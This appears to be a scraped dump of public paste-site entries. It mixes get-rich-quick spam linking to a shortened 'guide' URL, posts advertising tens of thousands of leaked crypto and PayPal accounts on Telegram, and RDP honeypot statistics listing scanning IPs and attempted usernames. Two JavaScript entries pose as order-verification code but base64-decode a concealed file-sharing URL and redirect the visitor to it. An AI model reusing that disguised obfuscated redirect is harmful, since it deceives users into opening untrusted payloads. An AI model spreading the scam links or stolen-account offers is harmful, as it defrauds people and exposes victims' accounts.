id,title,username,language,date,content
5BNVYdt7,Make $1000 15-MINUTES (BEGINNER) 96,someone123123456,JavaScript,Sunday 27th of April 2025 07:20:58 PM CDT," 
Pdf https://tinyurl.com/privguidee

MejAK6UQxJ
"
np9QJTPg,2025-04-27_stats.json,rdp_snitch,JSON,Sunday 27th of April 2025 07:18:13 PM CDT,"{
  ""ip"": {
    ""161.97.77.37"": 13275,
    ""211.185.207.14"": 24,
    ""71.82.170.60"": 27,
    ""118.34.56.88"": 3,
    ""80.94.95.198"": 60,
    ""205.210.31.42"": 9,
    ""80.94.95.90"": 3,
    ""78.142.18.92"": 3,
    ""157.245.104.150"": 12,
    ""205.210.31.99"": 9,
    ""157.245.156.139"": 3,
    ""62.60.188.24"": 6,
    ""194.165.16.163"": 6,
    ""209.38.239.28"": 18,
    ""2.42.206.111"": 3,
    ""159.89.6.147"": 1950,
    ""45.227.254.156"": 6,
    ""196.25.93.41"": 3,
    ""138.197.162.157"": 33,
    ""205.210.31.201"": 9,
    ""193.176.22.13"": 6,
    ""165.154.119.158"": 3,
    ""206.168.34.34"": 3,
    ""147.185.132.105"": 9
  },
  ""asn"": {
    ""AS51167"": 13275,
    ""AS4766"": 27,
    ""AS20115"": 27,
    ""AS204428"": 63,
    ""AS396982"": 36,
    ""AS208046"": 3,
    ""AS14061"": 2016,
    ""AS215930"": 6,
    ""AS48721"": 6,
    ""AS30722"": 3,
    ""AS267784"": 6,
    ""AS5713"": 3,
    ""Unknown"": 6,
    ""AS135377"": 3,
    ""AS398324"": 3
  },
  ""isp"": {
    ""Contabo GmbH"": 13275,
    ""Korea Telecom"": 27,
    ""Charter Communications"": 27,
    ""SS-Net"": 63,
    ""Google LLC"": 36,
    ""ColocationX Ltd."": 3,
    ""DigitalOcean, LLC"": 2016,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 6,
    ""Flyservers S.A."": 12,
    ""Vodafone"": 3,
    ""Telkom SA Ltd."": 3,
    ""SIA \""Singularity Telecom\"""": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""Contabo GmbH"": 13275,
    ""Kornet"": 24,
    ""Spectrum"": 27,
    ""Korea Telecom"": 3,
    ""Unmanaged LTD"": 63,
    ""Palo Alto Networks, Inc"": 36,
    ""ColocationX Ltd"": 3,
    ""DigitalOcean, LLC"": 1998,
    ""UAB Host Baltic"": 6,
    ""Flyservers S.A"": 6,
    ""Digital Ocean"": 18,
    ""Unknown"": 3,
    ""Xwin Universal LTD"": 6,
    ""Netline"": 3,
    ""SIA \""Singularity Telecom\"""": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Censys, Inc."": 3
  },
  ""regionName"": {
    ""Grand Est"": 13275,
    ""Sejong-si"": 24,
    ""Wisconsin"": 27,
    ""Chungcheongnam-do"": 3,
    ""Budapest"": 63,
    ""California"": 36,
    ""North Holland"": 3,
    ""Karnataka"": 12,
    ""South West"": 3,
    ""Tehran"": 6,
    ""Kaunas"": 6,
    ""Hesse"": 1968,
    ""Campania"": 3,
    ""Vilnius"": 6,
    ""Eastern Cape"": 3,
    ""Ontario"": 33,
    ""New York"": 6,
    ""Bangkok"": 3,
    ""Illinois"": 3
  },
  ""country"": {
    ""France"": 13275,
    ""South Korea"": 27,
    ""United States"": 72,
    ""Hungary"": 63,
    ""The Netherlands"": 3,
    ""India"": 12,
    ""Singapore"": 3,
    ""Iran"": 6,
    ""Lithuania"": 12,
    ""Germany"": 1968,
    ""Italy"": 3,
    ""South Africa"": 3,
    ""Canada"": 33,
    ""Thailand"": 3
  },
  ""account"": {
    ""hello"": 15303,
    ""142.93.8.59"": 111,
    ""BaFOSMcap"": 3,
    ""FxxnLO"": 3,
    ""FSlCWn"": 3,
    ""Administr"": 9,
    ""fFDdWxzRR"": 3,
    ""RPbtsu"": 3,
    ""TNmQpU"": 3,
    ""Test"": 18,
    ""cbAcTyEvl"": 3,
    ""ojviuu"": 3,
    ""jixxKG"": 3,
    ""Administrator"": 3,
    ""(empty)"": 3,
    ""qRBNMXHmk"": 3,
    ""bJoMZY"": 3,
    ""UWWXwP"": 3
  },
  ""keyboard"": {
    ""Unknown"": 15483
  },
  ""client_build"": {
    ""Unknown"": 15483
  },
  ""client_name"": {
    ""Unknown"": 15483
  },
  ""ip_type"": {
    ""hosting"": 15282,
    ""Unknown"": 153,
    ""hosting & proxy"": 48
  }
}"
pSETBRE9,2025-04-27_stats.json,rdp_snitch,JSON,Sunday 27th of April 2025 07:16:12 PM CDT,"{
  ""ip"": {
    ""161.97.77.37"": 8850,
    ""211.185.207.14"": 16,
    ""71.82.170.60"": 18,
    ""118.34.56.88"": 2,
    ""80.94.95.198"": 40,
    ""205.210.31.42"": 6,
    ""80.94.95.90"": 2,
    ""78.142.18.92"": 2,
    ""157.245.104.150"": 8,
    ""205.210.31.99"": 6,
    ""157.245.156.139"": 2,
    ""62.60.188.24"": 4,
    ""194.165.16.163"": 4,
    ""209.38.239.28"": 12,
    ""2.42.206.111"": 2,
    ""159.89.6.147"": 1300,
    ""45.227.254.156"": 4,
    ""196.25.93.41"": 2,
    ""138.197.162.157"": 22,
    ""205.210.31.201"": 6,
    ""193.176.22.13"": 4,
    ""165.154.119.158"": 2,
    ""206.168.34.34"": 2,
    ""147.185.132.105"": 6
  },
  ""asn"": {
    ""AS51167"": 8850,
    ""AS4766"": 18,
    ""AS20115"": 18,
    ""AS204428"": 42,
    ""AS396982"": 24,
    ""AS208046"": 2,
    ""AS14061"": 1344,
    ""AS215930"": 4,
    ""AS48721"": 4,
    ""AS30722"": 2,
    ""AS267784"": 4,
    ""AS5713"": 2,
    ""Unknown"": 4,
    ""AS135377"": 2,
    ""AS398324"": 2
  },
  ""isp"": {
    ""Contabo GmbH"": 8850,
    ""Korea Telecom"": 18,
    ""Charter Communications"": 18,
    ""SS-Net"": 42,
    ""Google LLC"": 24,
    ""ColocationX Ltd."": 2,
    ""DigitalOcean, LLC"": 1344,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 4,
    ""Flyservers S.A."": 8,
    ""Vodafone"": 2,
    ""Telkom SA Ltd."": 2,
    ""SIA \""Singularity Telecom\"""": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Censys, Inc."": 2
  },
  ""org"": {
    ""Contabo GmbH"": 8850,
    ""Kornet"": 16,
    ""Spectrum"": 18,
    ""Korea Telecom"": 2,
    ""Unmanaged LTD"": 42,
    ""Palo Alto Networks, Inc"": 24,
    ""ColocationX Ltd"": 2,
    ""DigitalOcean, LLC"": 1332,
    ""UAB Host Baltic"": 4,
    ""Flyservers S.A"": 4,
    ""Digital Ocean"": 12,
    ""Unknown"": 2,
    ""Xwin Universal LTD"": 4,
    ""Netline"": 2,
    ""SIA \""Singularity Telecom\"""": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Censys, Inc."": 2
  },
  ""regionName"": {
    ""Grand Est"": 8850,
    ""Sejong-si"": 16,
    ""Wisconsin"": 18,
    ""Chungcheongnam-do"": 2,
    ""Budapest"": 42,
    ""California"": 24,
    ""North Holland"": 2,
    ""Karnataka"": 8,
    ""South West"": 2,
    ""Tehran"": 4,
    ""Kaunas"": 4,
    ""Hesse"": 1312,
    ""Campania"": 2,
    ""Vilnius"": 4,
    ""Eastern Cape"": 2,
    ""Ontario"": 22,
    ""New York"": 4,
    ""Bangkok"": 2,
    ""Illinois"": 2
  },
  ""country"": {
    ""France"": 8850,
    ""South Korea"": 18,
    ""United States"": 48,
    ""Hungary"": 42,
    ""The Netherlands"": 2,
    ""India"": 8,
    ""Singapore"": 2,
    ""Iran"": 4,
    ""Lithuania"": 8,
    ""Germany"": 1312,
    ""Italy"": 2,
    ""South Africa"": 2,
    ""Canada"": 22,
    ""Thailand"": 2
  },
  ""account"": {
    ""hello"": 10202,
    ""142.93.8.59"": 74,
    ""BaFOSMcap"": 2,
    ""FxxnLO"": 2,
    ""FSlCWn"": 2,
    ""Administr"": 6,
    ""fFDdWxzRR"": 2,
    ""RPbtsu"": 2,
    ""TNmQpU"": 2,
    ""Test"": 12,
    ""cbAcTyEvl"": 2,
    ""ojviuu"": 2,
    ""jixxKG"": 2,
    ""Administrator"": 2,
    ""(empty)"": 2,
    ""qRBNMXHmk"": 2,
    ""bJoMZY"": 2,
    ""UWWXwP"": 2
  },
  ""keyboard"": {
    ""Unknown"": 10322
  },
  ""client_build"": {
    ""Unknown"": 10322
  },
  ""client_name"": {
    ""Unknown"": 10322
  },
  ""ip_type"": {
    ""hosting"": 10188,
    ""Unknown"": 102,
    ""hosting & proxy"": 32
  }
}"
eY9AFX2K,2025-04-27_stats.json,rdp_snitch,JSON,Sunday 27th of April 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""161.97.77.37"": 4425,
    ""211.185.207.14"": 8,
    ""71.82.170.60"": 9,
    ""118.34.56.88"": 1,
    ""80.94.95.198"": 20,
    ""205.210.31.42"": 3,
    ""80.94.95.90"": 1,
    ""78.142.18.92"": 1,
    ""157.245.104.150"": 4,
    ""205.210.31.99"": 3,
    ""157.245.156.139"": 1,
    ""62.60.188.24"": 2,
    ""194.165.16.163"": 2,
    ""209.38.239.28"": 6,
    ""2.42.206.111"": 1,
    ""159.89.6.147"": 650,
    ""45.227.254.156"": 2,
    ""196.25.93.41"": 1,
    ""138.197.162.157"": 11,
    ""205.210.31.201"": 3,
    ""193.176.22.13"": 2,
    ""165.154.119.158"": 1,
    ""206.168.34.34"": 1,
    ""147.185.132.105"": 3
  },
  ""asn"": {
    ""AS51167"": 4425,
    ""AS4766"": 9,
    ""AS20115"": 9,
    ""AS204428"": 21,
    ""AS396982"": 12,
    ""AS208046"": 1,
    ""AS14061"": 672,
    ""AS215930"": 2,
    ""AS48721"": 2,
    ""AS30722"": 1,
    ""AS267784"": 2,
    ""AS5713"": 1,
    ""Unknown"": 2,
    ""AS135377"": 1,
    ""AS398324"": 1
  },
  ""isp"": {
    ""Contabo GmbH"": 4425,
    ""Korea Telecom"": 9,
    ""Charter Communications"": 9,
    ""SS-Net"": 21,
    ""Google LLC"": 12,
    ""ColocationX Ltd."": 1,
    ""DigitalOcean, LLC"": 672,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 2,
    ""Flyservers S.A."": 4,
    ""Vodafone"": 1,
    ""Telkom SA Ltd."": 1,
    ""SIA \""Singularity Telecom\"""": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Censys, Inc."": 1
  },
  ""org"": {
    ""Contabo GmbH"": 4425,
    ""Kornet"": 8,
    ""Spectrum"": 9,
    ""Korea Telecom"": 1,
    ""Unmanaged LTD"": 21,
    ""Palo Alto Networks, Inc"": 12,
    ""ColocationX Ltd"": 1,
    ""DigitalOcean, LLC"": 666,
    ""UAB Host Baltic"": 2,
    ""Flyservers S.A"": 2,
    ""Digital Ocean"": 6,
    ""Unknown"": 1,
    ""Xwin Universal LTD"": 2,
    ""Netline"": 1,
    ""SIA \""Singularity Telecom\"""": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Censys, Inc."": 1
  },
  ""regionName"": {
    ""Grand Est"": 4425,
    ""Sejong-si"": 8,
    ""Wisconsin"": 9,
    ""Chungcheongnam-do"": 1,
    ""Budapest"": 21,
    ""California"": 12,
    ""North Holland"": 1,
    ""Karnataka"": 4,
    ""South West"": 1,
    ""Tehran"": 2,
    ""Kaunas"": 2,
    ""Hesse"": 656,
    ""Campania"": 1,
    ""Vilnius"": 2,
    ""Eastern Cape"": 1,
    ""Ontario"": 11,
    ""New York"": 2,
    ""Bangkok"": 1,
    ""Illinois"": 1
  },
  ""country"": {
    ""France"": 4425,
    ""South Korea"": 9,
    ""United States"": 24,
    ""Hungary"": 21,
    ""The Netherlands"": 1,
    ""India"": 4,
    ""Singapore"": 1,
    ""Iran"": 2,
    ""Lithuania"": 4,
    ""Germany"": 656,
    ""Italy"": 1,
    ""South Africa"": 1,
    ""Canada"": 11,
    ""Thailand"": 1
  },
  ""account"": {
    ""hello"": 5101,
    ""142.93.8.59"": 37,
    ""BaFOSMcap"": 1,
    ""FxxnLO"": 1,
    ""FSlCWn"": 1,
    ""Administr"": 3,
    ""fFDdWxzRR"": 1,
    ""RPbtsu"": 1,
    ""TNmQpU"": 1,
    ""Test"": 6,
    ""cbAcTyEvl"": 1,
    ""ojviuu"": 1,
    ""jixxKG"": 1,
    ""Administrator"": 1,
    ""(empty)"": 1,
    ""qRBNMXHmk"": 1,
    ""bJoMZY"": 1,
    ""UWWXwP"": 1
  },
  ""keyboard"": {
    ""Unknown"": 5161
  },
  ""client_build"": {
    ""Unknown"": 5161
  },
  ""client_name"": {
    ""Unknown"": 5161
  },
  ""ip_type"": {
    ""hosting"": 5094,
    ""Unknown"": 51,
    ""hosting & proxy"": 16
  }
}"
ie73dSGz,Crypto Accounts,hubertzoo90,JavaScript,Sunday 27th of April 2025 07:15:00 PM CDT,42283 Accounts Posted On https://t.me/leakedbyem1nem
gBBAiLba,Untitled,x2LeaF,JavaScript,Sunday 27th of April 2025 07:13:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/85758/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
c0c8Bqq8,EARN $900 INSTANTLY 2025⭐ NU,someone123123456,JavaScript,Sunday 27th of April 2025 07:11:43 PM CDT," 
Pdf https://tinyurl.com/privguidee

M5fIXKQLVr
"
1F7SpX7a,Make $1000 15-MINUTES  (BEGINNER) ME,someone123123456,JavaScript,Sunday 27th of April 2025 07:02:24 PM CDT," 
Pdf https://tinyurl.com/privguidee

KVh4zpAFyX
"
r84BDx8F,PayPal with Balance,hubertzoo90,JavaScript,Sunday 27th of April 2025 06:59:38 PM CDT,41146 Accounts Posted On https://t.me/leakedbyem1nem
fF8XuzUT,Products.js,x2LeaF,JavaScript,Sunday 27th of April 2025 06:58:18 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/04462/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
